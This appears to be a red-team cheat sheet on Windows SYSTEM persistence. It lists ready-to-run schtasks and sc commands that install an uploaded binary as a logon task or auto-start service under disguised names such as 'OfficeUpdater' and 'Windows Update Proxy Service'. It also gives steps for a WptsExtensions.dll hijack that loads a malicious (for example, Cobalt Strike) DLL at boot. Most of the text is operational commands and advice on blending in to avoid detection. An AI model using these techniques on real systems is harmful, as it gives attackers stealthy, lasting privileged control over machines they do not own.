This section details important and useful SYSTEM level persistence techniques. Since they are “SYSTEM” they will require administrative privileges and most of them execute during system startup.


-- Schtasks on Boot --

Upload binary to system folder and create scheduled task pointing at that binary for execution. Can change OfficeUpdater to a different task name that blends into target system

# Add task
schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH>

# Query task in verbose mode
schtasks /query /tn OfficeUpdater /fo list /v

# Delete task
schtasks /delete /tn OfficeUpdater /f

# Run Task Manually
schtasks /run /tn OfficeUpdater

# Optional: Can call schtasks to import a task as XML
schtasks /create /tn  OfficeUpdater /xml <FILE_PATH>.xml /f


-- Service Creation --

Upload binary to folder and create service pointing at that binary. Can change the service description and display name to blend into the target system

# Add service (Change displayname to a name that blends in with your executable)
sc create <SERVICE_NAME> binpath= "<FILE_PATH>" start= auto displayname="Windows Update Proxy Service"

# Assign description to service (Change description to a phrase that blends in with your service information)
sc description <SERVICE_NAME> "This service ensures Windows Update works correctly in proxy environments"

# Query Service config
sc qc <SERVICE_NAME>

# Query service status
sc query <SERVICE_NAME>

# Query service description
sc qdescription <SERVICE_NAME>

# Delete service
sc delete <SERVICE_NAME>

# OPTIONAL: Can execute sc.exe commands remotely by referencing the remote system after sc.exe
sc \\<IP_ADDRESS> qc <SERVICE_NAME>


-- Windows 10 .DLL Hijack (WPTSextension) --

Upload malicous.dll named WptsExtensions.dll (works with default Cobalt Strike .dll) anywhere in system path, reboot machine, and the schedule service will load the malicious WptsExtensions.dll

# List folders in PATH
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH

Upload malicous.dll named "WptsExtensions.dll" to folder in PATH

Reboot target computer (Schedule service will load WptsExtensions.dll on startup)

Remove uploaded WptsExtensions.dll to remove persistence


Note: Many .dll hijacks exist on Windows systems and a simple Google search should list all the vulnerable filenames, services, and even contain examples of how to execute a given .dll hijack technique on a system.
